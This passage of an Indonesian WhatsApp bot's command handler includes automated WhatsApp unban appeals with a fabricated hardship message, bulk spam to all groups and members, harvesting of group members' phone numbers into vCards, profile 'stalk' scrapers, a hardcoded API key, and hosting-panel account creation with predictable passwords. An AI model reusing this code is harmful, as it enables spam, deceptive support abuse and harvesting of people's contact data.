const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Hello, I just had a serious problem with my WhatsApp account.  Yesterday, I just created a new WhatsApp account with a new telephone number and suddenly it was permanently blocked. I have experienced this problem 8 times with similar cases, now my account is permanently blocked by WhatsApp.  This is very difficult for me because I used my last savings to buy a new phone number.  Currently, I am having difficulty paying boarding fees so I can buy another telephone number and communicate with my parents who live far away.  This all seems to be caused by a system error which is very annoying for users like me.  Now, I don't even have enough money to buy a new phone number anymore.  This situation is very detrimental and I am willing to pay the boarding fee in arrears to be able to buy a new telephone number.  Please help me unblock my account`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
xgreply(
`🗂️Unban Sucess Tunggu, Tunggu 1 - 48 Jam👌.

📚Note: Kami Tidak Menjamin Nomor Anda Akan Pulih🗣️

🗞️Persen Kemungkinan :

❕Ban Normal: 57%
❗Ban Perma : 5%

🌏 Account : ${targetnya}
`
)
} else if (payload.includes(`"payload":false`)) {
xgreply(
`
Payload.include(" payload": false )

❗🗣️: Unban Gagal, Kemungkinan Sedang Limit
`
)
} else xgreply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else xgreply('Masukkan nomor target!')
}
break

case 'customunban': {
if (!isPremium) return xgreply(mess.premium)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')
var targetnya = tosend.split("|")[0]
var teksnya = q.split("|")[1]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", system.gmail)
form.append("email_confirm", system.gmail)
form.append("platform", "ANDROID")
form.append("your_message", teksnya)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
xgreply(
`🗂️Unban Sucess Tunggu, Tunggu 1 - 48 Jam👌.

📚Note: Kami Tidak Menjamin Nomor Anda Akan Pulih🗣️

🗞️Persen Kemungkinan :

❕Ban Normal: 57%
❗Ban Perma : 5%

🌏 Account : ${targetnya}
🖥️ Gmail : ${system.gmail}
⛈️ Text : ${teksnya}
`
)
} else if (payload.includes(`"payload":false`)) {
xgreply(
`
Payload.include(" payload": false )

❗🗣️: Unban Gagal, Kemungkinan Sedang Limit

🌏 Account : ${targetnya}
🖥️ Gmail : ${system.gmail}
⛈️ Text : ${teksnya}

‼️Eror ;
${util.format(res.data)}

`
)
} else xgreply(util.format(res.data))
} catch (err) {xgreply(`${err}`)}
} else xgreply('Masukkan nomor target!')
}
break

//Fitur Nge Jb
case "jpm": case "post": {
if (!isDeveloper) return xgreply(mess.owner)
if (!text) return xgreply(
`
*🗿🚬Gagitu Bego, Kek Gini Caranya :*

*${prefix+command} teks|jeda\n\n

‼️Reply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik
`
)
await xgreply(mess.wait)
let getGroups = await ryozingod.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await ryozingod.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await ryozingod.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await ryozingod.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0]}, { quoted: m })
await sleep(text.split('|')[1])
} else {
await ryozingod.sendMessage(xnxx, { text: text.split('|')[0] }, { quoted: m })
await sleep(text.split('|')[1])
}}
xgreply(mess.succes);
}
break

case "pushkontakv1":
case 'pushkontakid':
case "pushkontakidgc": {
if (!isDeveloper) return xgreply(mess.owner)
if (!text) return xgreply(
`
*🗿🚬Gagitu Bego, Nih Gw Ajarin :*

${prefix+command} idgc|teksnya

‼️*Id gc itu id grub, cara cek nya ketik aj "> m.chat" di dalam grub ,nanti id grub tersebut bakal muncul. untuk alternatif nya, lu bisa make command ".cekidgc" untuk ngelihat semua id groub dari grub yang ada di nomor bot (Ini Khusus Owner (nomor bot) )*
`
)
const metadata2 = await ryozingod.groupMetadata(q.split("|")[0])
const colls = metadata2.participants
for (let mem of colls) {
ryozingod.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] }, { quoted: m }
)
await sleep(3000)
}
xgreply(mess.succes)
}
break
case 'pushkonv2': case 'pushv2': case 'pushkontakv2':{
if (!isDeveloper) return xgreply(mess.owner)
if (!isGroup) return xgreply(mess.ingroup)
if (!text) return xgreply(
`
*🗿🚬Gagitu Bego, Nih Gw Ajarin :*

*${prefix+command}\n\nContoh : Sve Ryo Ganteng, Nama Mu Siapa? Mau Jadi Pacar Gw Gk?*
`
)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let pler of mem) {
ryozingod.sendMessage(pler, { text: q }, { quoted: m })
await sleep(1000)
}
xgreply(mess.succes)
}
break

case "pushkontakv3":
if (!isDeveloper) return xgreply(mess.owner)
if (!isGroup) return xgreply(mess.ingroup)
if (!text) return xgreply(
`
*🗿🚬Gagitu Bego, Nih Gw Ajarin :*

${prefix+command} jeda|teks

‼️Reply Gambar Untuk Mengirim Gambar Ke Semua Participant,Untuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik
`
)
let jedany = text.split("|")[0]
let captny = text.split("|")[1]
await xgreply(mess.wait)
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (/image/.test(mime)) {
media = await ryozingod.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await ryozingod.sendMessage(men, { image: { url: mem }, caption: captny }, { quoted: m })
await sleep(1000)
await ryozingod.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
} else {
await ryozingod.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
}
}
xgreply(mess.succes)
break

case "savecontact": {
if (!isDeveloper) return xgreply(mess.owner)
if (!text) return xgreply(
`
*🗿🚬Gagitu Bego, Nih Gw Ajarin :*

${prefix+command} idgroup

‼️Untuk Liat Id Group Silahkan Ketik .cekidgc`)
await xgreply(mess.wait)
const groupMetadataa = !m.isGroup? await ryozingod.groupMetadata(`${text}`).catch(e => {}) : ""
const participants = !m.isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./dtbs/contacts.json', JSON.stringify(contacts))
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./dtbs/contacts.vcf", vcardContent, "utf8");
} catch (err) {
m.reply(util.format(err))
} finally {
await ryozingod.sendMessage(m.sender, { document: fs.readFileSync("./dtbs/contacts.vcf"), fileName: "contacts.vcf", caption: 
`🌤️Succes Om, UwU

‼️ Cara Menggunakan =
 • Download Filenya
 • Lalu Pencet Filenya
 • Import Ke Kontak
 • Pilih Email Yang Akan Digunakan

🗿👌 Selesai `,
 mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./dtbs/contacts.json", JSON.stringify(contacts))
}
await xgreply(mess.succes)
}
break

case "lookup": {
    inireact();
    if (!q) return xgreply(`Example: ${m.prefix + m.command} 62XXXX`);
    try {
        var response = await fetch(`http://apilayer.net/api/validate?access_key=4a1ede76e87d9e64682b284e8620ad68&number=+${q}&country_code=&format=1`);
        var result = await response.json();
        xgreply(JSON.stringify(result, null, 2));
    } catch (error) {
        xgreply(`Error: ${error.message}`);
    }
}
break

// Stalk
case 'tiktokstalk':
case 'ttstalk': {
	  if (!text) return xgreply(`Username? `)
  let res = await fg.ttStalk(args[0])
  let txt = `
┌──「 *TIKTOK STALK* 
──「 *TIKTOK STALK* 
▢ *🔖Number:* ${res.name}
▢ *🔖Username:* ${res.username}
▢ *👥followers:* ${res.followers}
▢ *🫂following:* ${res.following}
▢ *📌Desc:* ${res.desc}

▢ *🔗 Link* : https://tiktok.com/${res.username}
└────────────`
  await ryozingod.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m })
}
break
case 'igstalk': {
if (!args[0]) return xgreply(`Enter Instagram Username\n\nExample: ${prefix + command} unucorn_xeon13`)
    try {
    let res = await fg.igStalk(args[0])
    let te = `
┌──「 *STALKING* 
▢ *🔖Name:* ${res.name} 
▢ *🔖Username:* ${res.username}
▢ *👥Follower:* ${res.followersH}
▢ *🫂Following:* ${res.followingH}
▢ *📌Bio:* ${res.description}
▢ *🏝️Posts:* ${res.postsH}
▢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, '')}
└────────────`
     await ryozingod.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m })
      } catch {
        xgreply(`Make sure the username comes from *Instagram*`)
      }
}
break
case 'ffstalk':{
inireact()
if (!q) return xgreply(`Example ${prefix+command} 946716486`)
xgreply(mess.wait)
eeh = await ffstalk.ffstalk(`${q}`)
xgreply(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
case 'mlstalk': {
inireact()
if (!q) return xgreply(`Example ${prefix+command} 530793138|8129`)
xgreply(mess.wait)
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
xgreply(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break
case 'npmstalk':{
inireact()
if (!q) return xgreply(`Example ${prefix+command} xeonapi`)
xgreply(mess.wait)
eha = await npmstalk.npmstalk(q)
xgreply(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'ghstalk': case 'githubstalk':{
inireact()
if (!q) return xgreply(`Example ${prefix+command} DGXeon`)
xgreply(mess.wait)
aj = await githubstalk.githubstalk(`${q}`)
ryozingod.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break

//Panel
case 'listram': {
inireact()
xgreply(` ╭ ──▸ ListRam ( ${global.namabot} )
 │
 │ 𖣂 Sc Private 𖤲 <特> 𖤲
 │    名前 : ${m.pushName}}
 │   ⛩️ タグ : @${m.sender.split('@')[0]}
 │
${global.listr}
 │
 ╰ ───────⬣`)
}
break
case "listsrv": {
  inireact()
  if (!isDeveloper) return xgreply(mess.owner)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await ryozingod.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    xgreply(`Gunakan perintah ${prefix ? prefix : '.'}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;

case "delsrv": {
    inireact()
  if (!isDeveloper) return xgreply(mess.owner)
    let srv = args[0]
    if (!srv) return xgreply('ID nya mana?')
    let f = await fetch(domain + "/api/application/servers/" + srv, {
        "method": "DELETE",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
        }
    })
    let res = f.ok ? {
        errors: null
    } : await f.json()
        if (res.errors) return xgreply('Server tidak ditemukan')
    xgreply('Berhasil minghapus Server.')
}
break

case "listusr": {
  inireact()
  if (!isDeveloper) return xgreply(mess.owner)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${user.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += ` ${user.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await ryozingod.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    xgreply(`Gunakan perintah ${prefix ? prefix : '.'}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break

case "delusr": {
    inireact()
  if (!isDeveloper) return xgreply(mess.owner)
    let usr = args[0]
    if (!usr) return xgreply('ID nya mana?')
    let f = await fetch(domain + "/api/application/users/" + usr, {
        "method": "DELETE",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    })
    let res = f.ok ? {
        errors: null
    } : await f.json()
    if (res.errors) return xgreply('User tidak ditemukan')
    xgreply('Berhasil menghapus User')
}
break

case "addsrv": {
if (!isDeveloper) return xgreply(mess.owner)
let s = text.split(',');
if (s.length < 7) return xgreply(`> *Format salah!*

❗ Penggunaan:
${prefix + command} nama panel,tanggal,id user yang ingin ditambah kan server,eggId,locationId,memory/disk,cpu

\`✅ Example\` : addsrv Ryocakep,26 Desember 2018,1,15,1,0/0,0
`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name + ' Cp-ZxV',
"description": 'Create with ' + namabot,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return xgreply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
xgreply(`
❗ *SUCCESSFULLY ADD SERVER*

TYPE: \`${res.object}\`

ID: \`${server.id}\`
UUID: ${server.uuid}\`
NAME: ${server.name}\`
DESCRIPTION: \`${server.description}\`
MEMORY: \`${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB\`
DISK: \`${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB\`
CPU: \`${server.limits.cpu}%\`
CREATED AT: ${server.created_at}\``)
}
break

//Panel wak

case '1gb': {
    if(!isReseller){
        xgreply(mess.seller)
    }
    inireact()
  if (!isDeveloper) return xgreply(mess.owner)
    let t = text.split(',');
    if (t.length < 2) return xgreply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
    let username = t[0];
    let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
    let name = username
    let egg = global.eggsnya
    let loc = global.location
    let memo = "1024"
    let cpu = "50"
    let disk = "1024"
    let email = username + "zxv@sweetrabit.ml"
    akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg" 
    if (!u) return
    let d = (await ryozingod.onWhatsApp(u.split`@`[0]))[0] || {}
    let password = username+'001'
    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    })
    let data = await f.json();
    if (data.errors) return xgreply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes
    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    })
    xgreply(`User ID: ${user.id}`)
    let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ryozingod.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
    let data2 = await f2.json()
    let startup_cmd = data2.attributes.startup
    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
        },
        "body": JSON.stringify({
            "name": name+' - 1gb',
            "description": 'Create with '+namabot,
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 5,
                "backups": 5,
                "allocations": 5
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    })
    let res = await f3.json()
    if (res.errors) return xgreply(JSON.stringify(res.errors[0], null, 2))
    let server = res.attributes
    let p = await xgreply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '2gb': {
    if(!isReseller){
        xgreply(mess.seller)
    }
    inireact()
  if (!isDeveloper) return xgreply(mess.owner)
    let t = text.split(',');
    if (t.length < 2) return xgreply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
    let username = t[0];
    let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
    let name = username
    let egg = global.eggsnya
    let loc = global.location
    let memo = "2024"
    let cpu = "70"
    let disk = "2024"
    let email = username + "zxv@sweetrabit.ml"
    akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg" 
    if (!u) return
    let d = (await ryozingod.onWhatsApp(u.split`@`[0]))[0] || {}
    let password = username+'001'
    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    })
    let data = await f.json();
    if (data.errors) return xgreply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes
    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    })
    xgreply(`User ID: ${user.id}`)
    let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ryozingod.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
    let data2 = await f2.json()
    let startup_cmd = data2.attributes.startup
    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
        },
        "body": JSON.stringify({
            "name": name+' - 2gb',
            "description": 'Create with '+namabot,
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 5,
                "backups": 5,
                "allocations": 5
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    })
    let res = await f3.json()
    if (res.errors) return xgreply(JSON.stringify(res.errors[0], null, 2))
    let server = res.attributes
    let p = await xgreply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '3gb': {
    if(!isReseller){
        xgreply(mess.seller)
    }
    inireact()
  if (!isDeveloper) return xgreply(mess.owner)
    let t = text.split(',');
    if (t.length < 2) return xgreply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
    let username = t[0];
    let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
    let name = username
    let egg = global.eggsnya
    let loc = global.location
    let memo = "3024"
    let cpu = "90"
    let disk = "3024"
    let email = username + "zxv@sweetrabit.ml"
    akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg" 
    if (!u) return
    let d = (await ryozingod.onWhatsApp(u.split`@`[0]))[0] || {}
    let password = username+'001'
    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    })
    let data = await f.json();
    if (data.errors) return xgreply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes
    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    })
    xgreply(`User ID: ${user.id}`)
    let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ryozingod.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
    let data2 = await f2.json()
    let startup_cmd = data2.attributes.startup
    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
        },
        "body": JSON.stringify({
            "name": name+' - 3gb',
            "description": 'Create with '+namabot,
            "user": user.id,
            "egg": parseInt(egg),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": memo,
                "swap": 0,
                "disk": disk,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 5,
                "backups": 5,
                "allocations": 5
            },
            deploy: {
                locations: [parseInt(loc)],
                dedicated_ip: false,
                port_range: [],
            },
        })
    })
    let res = await f3.json()
    if (res.errors) return xgreply(JSON.stringify(res.errors[0], null, 2))
    let server = res.attributes
    let p = await xgreply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '8gb': {
    inireact()
  if (!isDeveloper) return xgreply(mess.owner)
    let t = text.split(',');
    if (t.length < 2) return xgreply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
    let username = t[0];
    let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
    let name = username
    let egg = global.eggsnya
    let loc = global.location
    let memo = "8024"
    let cpu = "200"
    let disk = "8024"
    let email = username + "zxv@sweetrabit.ml"
    akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg" 
    if (!u) return
    let d = (await ryozingod.onWhatsApp(u.split`@`[0]))[0] || {}
    let password = username+'001'
    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": username,
            "last_name": username,
            "language": "en",
            "password": password
        })
    })
    let data = await f.json();
    if (data.errors) return xgreply(JSON.stringify(data.errors[0], null, 2));
    let user = data.attributes
    let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    })
    xgreply(`User ID: ${user.id}`)
    let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
ryozingod.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
    let data2 = await f2.json()
    let startup_cmd = data2.attributes.startup
    let f3 = await fetch(domain + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey,
        },
        "body": JSON.stringify({
